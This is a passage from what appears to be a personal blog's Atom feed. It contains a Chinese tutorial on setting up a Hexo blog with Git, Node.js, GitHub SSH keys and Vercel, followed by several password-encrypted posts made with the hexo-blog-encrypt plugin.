git</a>,下载安装。</p><p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><p>以Centos为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure><p>安装好后，用<code>git --version</code> 来查看一下版本</p><h3 id="拓展内容-Git小乌龟的安装及使用"><a href="#拓展内容-Git小乌龟的安装及使用" class="headerlink" title="拓展内容 Git小乌龟的安装及使用"></a>拓展内容 Git小乌龟的安装及使用</h3><blockquote><p>Git小乌龟是Windows平台的一款Git管理工具，适用于不怎么喜欢使用命令行的人</p></blockquote><p>请参考链接 <a href="https://www.jianshu.com/p/33108325fc87">Git小乌龟的安装及使用 - 简书 (jianshu.com)</a></p><h2 id="1-2-Nodejs的安装"><a href="#1-2-Nodejs的安装" class="headerlink" title="1.2.Nodejs的安装"></a>1.2.Nodejs的安装</h2><blockquote><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时。</p><p>Hexo基于Nodejs进行编写</p></blockquote><p>Linux：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install nodejs</span><br><span class="line">yum install npm</span><br></pre></td></tr></table></figure><p>Windows:</p><p><a href="https://nodejs.org/en/download/">nodejs</a>选择LTS版本下载安装</p><p>安装完成后需要检查是否安装成功</p><p>Windows：</p><p>桌面右键 <code>Git bash here</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm -v </span><br><span class="line">node -v</span><br></pre></td></tr></table></figure><p>查看是否安装成功</p><p><strong>可忽略</strong>国内环境大家都懂 你可以使用npm换源防止后面报错 </p><p>注：因为淘宝源更新不及时 后面许多依赖同样会导致报错 推荐使用官方源搭配Magic网络使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查看源</span><br><span class="line">npm config get registry</span><br><span class="line">//更换源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br><span class="line">//淘宝源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h2 id="1-3-安装hexo"><a href="#1-3-安装hexo" class="headerlink" title="1.3.安装hexo"></a>1.3.安装hexo</h2><p>输入以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>依然需要查看是否安装成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>新建一个文件夹并初始化hexo</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mikdir Blog &amp;&amp; <span class="built_in">cd</span> Blog//新建叫Blog的文件夹，如果你是Window直接新建文件夹并在文件夹里右键打开即可</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>注意：若此时hexo init报错请使用Magic进行上网</p><p>新建完成后，指定文件夹目录下有：</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题</li><li>_config.yml: 博客的配置文件</li></ul><p>接下来就可以使用了 本地查看Hexo命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>在浏览器输入localhost:4000就可以看到你生成的博客了</p><h2 id="1-4-Markdown编辑器配置"><a href="#1-4-Markdown编辑器配置" class="headerlink" title="1.4.Markdown编辑器配置"></a>1.4.Markdown编辑器配置</h2><p>这里推荐Typora<a href="https://www.typora.io/">Typora — a markdown editor, markdown reader.</a></p><h1 id="2-账户配置"><a href="#2-账户配置" class="headerlink" title="2.账户配置"></a>2.账户配置</h1><h2 id="2-1-Github配置"><a href="#2-1-Github配置" class="headerlink" title="2.1.Github配置"></a>2.1.Github配置</h2><ol><li><p>首先你需要一个Github账户</p></li><li><p>新建一个仓库 推荐私人仓</p></li><li><p>在菜单里搜索Git Bash，设置user.name和user.email配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密钥文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</p><p><img src="https://pic4.zhimg.com/v2-d1e47103ec1aa8675f68688c5d63bd27_r.jpg" alt="img"></p><p>打开<a href="https://github.com/settings/keys">GitHub_Settings_keys</a> 页面，新建new SSH Key</p></li></ol><p>   <img src="https://pic1.zhimg.com/v2-72a3f22c080e99343c3cc4aabce10e3c_r.jpg" alt="img"></p><p>   Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。<br>   在Git Bash中检测GitHub公钥设置是否成功，输入 ssh git@github.com ：</p><p>   <img src="https://pic3.zhimg.com/v2-da481ffa686410becd4186c656b4ebd6_r.jpg" alt="img"></p><p>   如上则说明成功。这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p><ol><li><p>桌面执行命令</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">&quot;刚才新建的仓库有一个Clone</span> 复制里面的链接 粘贴到这里<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>将里面的.git(隐藏)复制到刚才新建的hexo博客里面</p></li></ol><h2 id="2-2-Vercel配置"><a href="#2-2-Vercel配置" class="headerlink" title="2.2.Vercel配置"></a>2.2.Vercel配置</h2><p>1、先对刚才的源代码进行一次提交1、添加文件到版本库缓存区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><p>2、添加文件到版本库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;备注信息&quot;</span></span><br></pre></td></tr></table></figure><p>3、请忽略</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="keyword">add</span> origin 远程库地址</span><br></pre></td></tr></table></figure><p>4、push到远程仓库</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin main(推送到的分支名称)</span><br></pre></td></tr></table></figure><ol><li>新建一个<a href="https://vercel.com">Vercel</a>账户</li><li>点击New Project </li><li>Add Github account </li><li><img src="https://img1.tianli0.top/hexo/vercel.png" alt="">一直愉快的下一步</li><li>博客部署成功 以后上传会自动部署 若需要绑定自定义域名在Settings里面绑定即可</li></ol><h1 id="3-Hexo的使用"><a href="#3-Hexo的使用" class="headerlink" title="3.Hexo的使用"></a>3.Hexo的使用</h1><p>现在来介绍常用的Hexo 命令</p><p>相关命令：</p><ul><li>新建文章</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">post</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><ul><li>新建草稿</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">draft</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><ul><li>新建页面</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">page</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><ul><li>在指定文件目录下新建文章</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">post</span> --path Web/React <span class="string">&quot;Taro小程序&quot;</span></span><br><span class="line"></span><br><span class="line">表示在_posts下面新建了一个Web文件夹(如果这个文件夹不存在)，在Web文件夹下建立了名称为React的markdown文件，title为Taro小程序</span><br></pre></td></tr></table></figure><ul><li>清除缓存</li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo c 或 hexo <span class="built_in">clean</span></span><br></pre></td></tr></table></figure><ul><li>生成静态文件</li></ul><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g 或 hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure><ul><li>发表草稿</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo</span> publish draft <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>查看某类型下面的文章</li></ul><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">hexo</span> list &lt;<span class="keyword">type</span>&gt; </span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>支持 page, post, route, tag, category</span><br></pre></td></tr></table></figure><p>npm install hexo -g #安装Hexo<br>npm update hexo -g #升级<br>hexo init #初始化博客</p><p>命令简写</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;我的博客&quot;</span> == hexo new <span class="string">&quot;我的博客&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">hexo g == hexo generate <span class="comment">#生成</span></span><br><span class="line">hexo s == hexo server <span class="comment">#启动服务预览</span></span><br><span class="line">hexo d == hexo deploy <span class="comment">#部署 若使用我的教程 请忽略</span></span><br><span class="line"></span><br><span class="line">hexo server <span class="comment">#Hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s <span class="comment">#静态模式</span></span><br><span class="line">hexo server -p 5000 <span class="comment">#更改端口</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment">#自定义 IP</span></span><br><span class="line">hexo clean <span class="comment">#清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure><p>刚刚的三个命令依次是新建一篇博客文章、生成网页、在本地预览的操作。</p><p>最后修改confi.yml里面的内容 </p><h2 id="3-2主题的使用"><a href="#3-2主题的使用" class="headerlink" title="3.2主题的使用"></a>3.2主题的使用</h2><p>我的主题为<a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></p><p>请参考里面的文档进行配置 开发者已经写的很详细了，这里不再赘述</p><hr><h1 id="我的魔改"><a href="#我的魔改" class="headerlink" title="我的魔改"></a>我的魔改</h1><ul><li><strong>就不告诉你，你气不气</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Hexo" scheme="http://chalnl.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>插件</title>
    <link href="http://chalnl.com/post/4317.html/"/>
    <id>http://chalnl.com/post/4317.html/</id>
    <published>2022-04-13T13:12:21.000Z</published>
    <updated>2022-08-16T13:14:36.800Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="a018e13860b599ab27ebf72873733f9c91e204b1cf9f8d6bb17811d82f048cd6">5d2895ca814fabc53021ff8e5d1600762b6f2568a99838fa5b91373cfb67be44eff7da19012db4db13932ca8bc21c9a8c56c50a5295f1d8fed8915b36570c4ed2d90d114c49eb633e19cbb749149d0c3392c13cccd2735369242372003ae464614b195b1e3f6d5b53504abce51c67a88cc5135a4be962334cb7253b25dde7486da3d7d8e29f98f485efb6e7bc1f1ef5513142e99620dee14406ef535753b51136a5fcf9b2a4ee25470aa06d71964e67c9c4592e1c37daff06650ee349b89d8d102f73bc0d1bf58e8ea3a25fc30889420b858a055980e2704381b1284ccbe01de551f4aae9e4fce882edd769dee363d77698841700272c0fc973d3bd722487f083276ef624eb3edbb3d2c72258cf8521b43701f9d48105956b33691c7546fe0f99c398d7eb43a0904afd20584bca6ae2f49d22c43ec1bbd591483c98d51c94dd7bee975b8609602501871985722a1c5922b9bd1be12d21591901142e42015af7bce84288350f7a2b4197faf2911a25d2fd4a0b83e70d852272397730a20dc3a073a1718210b027e20c6845c7e018765ccc4472f9102a51bc24aa310b625fe1c4853bb9ff323b6b4debc80a8d7f390521133026c20f4188b3ee3e8104cb0069219f603cac7d22a755d027422c747f1f68bc729b91b6ddc229a50ff32ea1bb0d24aa72fb0e166e7f4fac603fd320af55f86bb4d9a0cedd81d19d2b8ef859c41cbdf73ddefd3e9e03347be684901aef5a96a7784d576f598760145a6a703d5d2a332eb560de9dc3f5af4c0983844d2bc1a8a3c63ae8c00ba33e7d6887abe68d906046844ce6574888b15aaaad4411173a55f018ff55aa7cff8c8ddbe46587dbfec5b5593b2924b64c6ee7b9c24a1d07e854b4139dfad68f1b0b92925bfe29f608880953574e9de46d2b4dcaba6905aae6c3968c78ede91bf0215ce579e79cae94094c0e284459aa19cd60da1fafab1bf5de46d2f856b7124eb27fd30467d8816c21ccbbd1f8419e7b9026130f8474827cf7442558f0f9502ffb6bef7e1a3d7a485c419aca3f1125ed84351c72213972b8840b6cd2ddabfd86295054319d9bc01c56a9ec1b1831d43ce29d86e0195aef9c70d00f484d3d3b262cd675450c92e20039430415eb66eda8ecaf26db86c28f0fd7184c151a6649d84982849f44bb1cd06e7a53d9e72bef35f78d3d9b7fdd31bd1ac5deabc6f7d905e9390004e7a6a4f1645d4e2806708bda0f9f11ee8b54d4212ba220c3adb57a028c2137e2f646d9e80119481659babffd41b2ab09d774bf34901110074bd8316aafc77b2c62ee7b8d27b0e23d9774307f83a23b77e31a0883dc211379933ed5cb62808fc79e80633633dcb35e9cf7d22d19ba20e1fcd49a722b9e589f3cb987c5ce51b67b9c02a226dc0ed2276d9bf743c95461657af602376bbac0e449adacb845e4d12ad8f990e739fb698ccf5abf691c8a538fb216f669b6f86313d4426a085ae4524f7ee2ebebc92665c4dc874253f8e87c46840756ea223b83c71a7cbce653484be44bebe75711eb21a7138b04905534eea088ff0464b71520aee80195de124510f371ea1d0c0d12d335a6f27360ce8bb1b827e461a569b6c48d43329bab89b1c35d29ece8de94e2e284b5bbe579b40e287d0ffb85e89a6c6205444e16e51856dac9d4dd5a715e33132214e965ad3205f0cf9c80a68c23f7d69ad1b14fab8f4a9002ef9f818c312fe763b0cc6cc49686003c0fcf30432cbf66979de96bcf169e917a928d0c3b4319d852576b0281077d9bed2914facb019249122f455f71b1a9f5126806fe3d099ba479c23d5be6b4e8e5f83ea4ec89a52ec350cdb237c1b9a9293c09114ace2b929518d8734632c04cf8e7e6a5ab44b8c5d5e09363a0ccc996afc803cd879f6599edcfda8243041331e5546aebca470d12c9756fbc79697aabc45e715f79b1f358818ff2a5dd6e655b993847b2dc2bef878812fe24262e7a927a60968ff51fda153a44a725426a5935c82bb8e8af77165c090b939aa1be2db0e0122e3bacd561498d3736cd9ab67c5d4cf516d2b1594853f7dd72995f0223eb7b4ba40d71e3ed9b7a061ddeea24f5f22e752c000231e0c5f28849b3bb83aad3867d4f99d862c89</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="加密文章" scheme="http://chalnl.com/tags/%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0/"/>
    
    <category term="配置" scheme="http://chalnl.com/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>GitHub加载过慢问题</title>
    <link href="http://chalnl.com/post/12070.html/"/>
    <id>http://chalnl.com/post/12070.html/</id>
    <published>2022-03-13T13:12:21.000Z</published>
    <updated>2022-08-16T13:14:40.502Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="0015342a58d7ae3f3b7b01ea2978767f8adaaa3cc6a47850ff86e5c79612ed11"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="加密文章" scheme="http://chalnl.com/tags/%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>QQ机器人（暂不开放）</title>
    <link href="http://chalnl.com/post/28.html/"/>
    <id>http://chalnl.com/post/28.html/</id>
    <published>2022-03-08T06:07:05.000Z</published>
    <updated>2022-08-16T13:12:28.865Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="f629bd1ffcc345dc369bb6c835e64903830e894b7624c4e701ef852e268917be">c57f1e954efda31a56783eb00f210f8d3933f7d82dd99a5f9ee06aebf5c8b330a1c6264bfab3b777c91c7897a28cfd5b4b1a535ec06263b91511deadcfa91ff5292a32357a3a75c3ede8f2f15e290b80212d0a942c782b589606d4a9e381e8e608bf3438a565534ae8345668fd49ce78fec8329b4997a2d9f164be47b5b245a445cfe0ce6770f83a09170d188170d8877205825519da11ba9b69a8fc841439be2bf2c2f9a48c6068c653b927a98b7660aae0fd3d1acf4b24d105c33e11db78ba4a4b616704f62f6aee1aa020f176f5c1a1e8c3036c1a7452c83ea76d732604cda911e24cefc9cc9dfb32484984376c60e1faa05d6140ce23720653ca8e7e49bc66192910a64fe3447b4a01c2d0fe003cd68a38196d76216923e99d0944f6274f83b86bb7b783e9453cd3545c60e8d549c5cd7234a2e34d9f687566a7b66e2e667bb7d007e55b67445bea56a7d0ca89827346e30297ea5c97f359feb9d22e45f841f941ca0e2224503e271dccaa7b39e9cfa2d7ff130dba4998084292c4a13e9f9fb992991f7e655bf8d7a3b80ed959d280f410b3323722dad378487ee6ca7a18bb49355d6000b9556ddbdc03be35da7a326a307f7f5e6c083aecb55740ad21d7ee4e42d878153a888e401894dc4d451b31a8a410017dab7807092e0279570e97572074053a6a65321fdc0d3ee99f2d824a6513ae591bd843ce3146a931539cdf7cc27ab01e72b4e47d5f96a2b4ca4cd8800e6e4b1681c7e7ac604d62e6de6eec596c027aa038ccdf3e555cc371875d72af5e4d6dea6e7fa9e1d79e81af8c4963292c7dfe4060c332ddc555818336ebca020c2fdb0e599ab9e8870bef87e8ac06c5dc6ed3ba5546c0c99557b33a8bd38e32a46375f6546aa618dc82907b0847917716c51090d340ff68d001f11f11e038b4776ea1ae662f2ea48bfbf5bd07dae7aed823d7a795d1a759c1e343bb938fe39134f4e71d01a7398b4ccbc779d50f4c86b7db6f0229aee193ea3b3f0ab3656eb9f9478c9cc707c474584356378b1c787b1f523f062a93b74b0393096463bc6cc5181e54eb1a83e0fe094aebcd8a58cd070dfa527bea934c0cff7290e4ed748f8076a2bda2a9f7ce21acb4b20af3f5f2b796fead18415afba556b1aef4585c2cf3ff5d36c94ed768e42a587d77ea13ea5a18999b720467dab4d2963f52d6b0d1c8a765e62e0cd07ca062270d72b7b5d995fa6b3b10bca2e9e80b6119d0011eb45e2fae08c7ce343a9dbdd084ce4d3dfc60aaa02099bf5cf9659a4381eb6b60039e705f904793fe7ea1e80c113170e2a286be132b4dd86f6d15c2162d69ce6cb62fa9876f1cceb987c410bb33006065c76f8f9d57406fcd47bdf07bc238194c913e25eba4f257c381a2c7db2978000752485e7c25ac3e4db830a3b36464c5762a068613fd8cd28c0f828267118c504f1352c1f518dcab2d28de0631f99e66617a41962bbf2698536f6350ffec28ffb612958be7fea95ee1b148522e70032af6a5eed0fef94d070cba51f1e698d931bca412daa9ac42339d7bee2fabd97c2bdcd0f20f5e1b45e038b5b593f60c7de9121aca78fe8db355cb3e27960e9e594a242907d79566da741844657f3ad8210dd7d9c383cf78b19b3fd61a14a98d78b7b20eb61e93c239e5d4673afd32ca5a53043963a72575b997eb0e51c1122495b4a37d73dbc3ee9b1c8f45ed1396415aebe729435db187413c44ae09f37fb20852eb3b903b0b5a8f5d5c8fda100de60e4e221c6b41c2de6dc636334744a81e91fe8db34a714664af07b52d695dac5a32fcbda5b477deeb26faddd68582cf22dac8289fa54f0b6e6f0d9cfd267fd4d2e4b33ecd8ba61a2070492e2c7cb9731c8f9ca239b5f3c41c62f79a8b2c9e09d46f2a75ff2eca0c33d7aef3c8e022c293b272279c099553f8c520b88e977a8a158b9160616316dd5c5bcfc94c64d3fc6e23b898618433d6f580b229ec9529e9ad749fc7d5c88850f586af68991e8b31a65f6108f2796a697b05ba5046c5ca00e4535dfe5a740928c5bb0e943a850720a43805f7de622ce7dfbd2d6205608472183305d1b42c41ead3da3093da02c30055830355a3dd67d71ef3d0322754013dbfd19b9c6c721643b8ebca62561dc887257169a7010e6e2bd7cfa1be4b863762b51fe6a594d7ab4d17d327d122c73667a31ad9a742bf631bdc89471a0f3a0e185b8a96b8d13fb8f96d64ee54b2fb0fb350b3106bfac7c8aedd982fc577c69f55b2b7bee390e4722338646cad6857a6968cc16de3b6984f3e9c5254214d71d03c16938915cd203aa4874ff0c30a37ffd39848b8c97ca1efdf7cb54bb1e654990f35d18aff8cff9fe93bfd84b678f08958bd9c0f849ddb9c69c46139aa22423ccb0198c21860a7a0e64408b545a35586c626b32b9c268f2150f26fbe61f199da54086ab3dd12383c633685ee01300225beff4705989b9e18be99b35b9b519b307f2313b07f27d043c33f211dcaa62527a8d2296d00e688dac7177ab48e01039d18f55dd98df67c1ab49c74cb99eb2f6e4986308ad067432818475cc92a8d000209d09b1b817dc72b9b7ee5414fd68990d3238806ba1dd9a6b21e8919f0d5e35c113aba012fcd54ef6280c8c7044918748c1171200263001544dd2cfc31af280055345274988209fc909b6c38cc3b3f8fc1dc2d0f5aa31dab2694c993bed07a3446a75d77fd449992e012cbc3ccf8e7e87366b3724efccca8171965f1cc307322027724534c4d7ffbd12329b468acc49308eda7a6100cf325b1fc32c9f7a96a9e5adfc96636e0c56c2d4cf46fa024d1ed27ba5f0662639160ae2d0e6215e412067f1042c5449da24392c4f8821c479a1e65fc0eb659248e3cab6b7c59fd9e6eca6de43889769c9e05ba30d2c8b2a907ab65692cfff6f91faa26abd38c0aaaceb723a9e840b385f173d0b0bc658ac8f7011b249ab0c304307932c605ec20b3b6eb94e02eb38001d32c806fc58dafac92dcf83a563fd9378c4909b745edb79189ac03917dad40e77031b6cd0b2f669c52f1346b705399f2e690f6f67f0a01b911cb0b6194741294f34d9eaf2098fb8c6b29ae4984eb9ef6919ee7471231d9f97e6f27da08f4fdf775c905b39f073aea461d0203f6fb013b270cf5b0b503f9c3d6505f397494a7b001af6268ade8018e4a50122138e1a29189f1bcecdabc39f3c564bfccfcbd179752eeeb539c6322efce92d1c8b2c588e944cf2ba778f5157e59dd23b6cfdbb5552c0ee266a9ce3c446d2eefdb9acc2d97cd044e804f4ee50f2be1dbb4c45208a6152fb12d67066769c2eef78cf1a34a806980e99c37ee4fbee730d1de566009b446f3791927ff627c2253c8f39cd72ea0069b54221f2479aca3c7c9f3aff7fb61481cc3eb3000579d0da37449177b736643b372b24616e18ca531be7609369a9ec6248caa2fb65f26999a0f2e8ee702aea6ad89344c3c823eea0e3b849f848e35d69143196c58597a564587f0470be57a90b33146158639086b20cfb554ae700e2d67bc8de5bf95a817b3abb7c200cec7a970750c461bd7755b4013cb3c63b94d47650544410335f541af68cf2b8166d920e6fa126adeb2f1beda0fa6a454e2b3a653730d1a366bb8bd8721f29075703454bbf31025b7a8b0b3386d52bb6b9386ed0230a7aa7a0fcefbf0b52225cd60fbe1135956a1836581d1a32b6dcaacb88d4ab1d233011efe309ea80a39a4fc455bb4e05cbe7223a50305461b82d6162df489b8457e5d393eadcd33360b5c0b3c8a7a81d1b06e7bef7bbff6c69d8ed3020cbb31841dfbedb7a2d9b5733796bbc81a9aca4d0d8a44cd85cf7923a9e0535f4625512e7d45b70299119f448da0313b012236174db669bc0e8f121ffefafba46f88592af99c8911692004c6c0539a0ca59689e70dcb407ac570c9e210aa3cfe9902c1f2b9bdb5bdec866da08e5a81544547872336f5367f06d22429ff213575753343b6a2820231f0450b4d31f8ae53135744f636c0b8413a07e2da5a78648039e13492b6955898be49d63df070fcf694484aa20e27ab910586714c650613bd418add85a27c6b4dd9a6cac7023cba1e88ddf477d44f0b3ba09fb44dcc4e1553f01cd33039203e8fa702bd430e58feeede403964461480cce3660ea8f96e3f7fd0b9d3b8ed32b3e73c5f8dde591acd7a1bb00efe947936ee9a815881029386d0c171da570485dd0367928a8f003defb7ef94c3d62da0f868798f8be443afabfe1cd8ea16a9119817835ef4a93a6e723099d4221cc94f90c664b98f802890103b047331d06d5a3f207dfaaabc227d1c714c8cad21bb6df611d6d6d78cc906736fb7a9d2b56e09640e55a833ea545c4c9f07cca2097658054a40c765878bd5d3512ed773b8d80ca01af2c5f9a9cca9b92ad91213b1c6e93e3e678199a5f8f415909ab64f1ea3d9c85b34bd7552be706e00118ded26846e67b7deb295c1ad401ed9fcd4dec7ce8170342c3613018abffcfaf7cffe51e43cb624199cb1f2f95e98b075dfaa9aa83c3588339b4dac8522ed7952169af38b9ab397ceee0cb7afcbf9e2ed27747d9bd332a7ee4e6e54b5209040dc3851f62cc120103924471669093f1bbbda2acb4b6a054692d4b0f3c60cf5a06e0feb07e6150a3d0541f6fda55d8e21a4436c7e7d65f262001b99579d8294380f715518de102c805bee059df1aba43f9fcc4c0979409fc3fbaeb0d706b19c58507d876795865572d31b7812aa82867004b1cad7822febed58643550f8abbd0f2d00e1cad90759f6b3d56df983a1a07e93de863275a7c7ec1cb93d5bda858cd3fab82b8502082adb7ef6a68ace090d776bcd1be8d0fb64b73f61494a1619ab62c4eee37a11a7fce35299df993a063d5ecab45af5bd8f2150d201a1375d60f101dcf04cbf2b7c8fecfe0fccbe86036fab80c9ce8c88a424439fde740be7143e3ed54727a31d4ccfc512407e1bb96a777845db7a796dc0d50ebd006c4577f509c506618a1dff69003fb5001db9fa96608b62534b486776ad1668d2b1a6361064d8eaecdc7ef62741a0b14165ba6b1a2736e8af82ce091f808321c885353eb7c4f7f02a89881d90ac37670283f045c8fb0dd18e710907115ee92261e06ac8aa0508d1141583051f343a57aaabf81f0880815504e43a8c749516a780ee5ecd4aa9f8b92976a63f316a4dc73385b6c5bc021370528aae624157f7fb79ac68ce23fa945422f772769a932c325e6c9e6a8b070ceafa2978da9df381d96528cb9331994ebbc6bebdd066f07e0ced2cc4da832df7f5529e0b3c7ad702342eeea90e84c9fcd16faa8dcbf2dfb8152a5e6a17ab0dffecd5cf9ab1623c37aa56fcb78f0cfdfb8585e23cea2681dcfe7b611dbe98e5475b7b02c7b6d85bf9c9d505f0951c2ff1cab48fb3221d0a9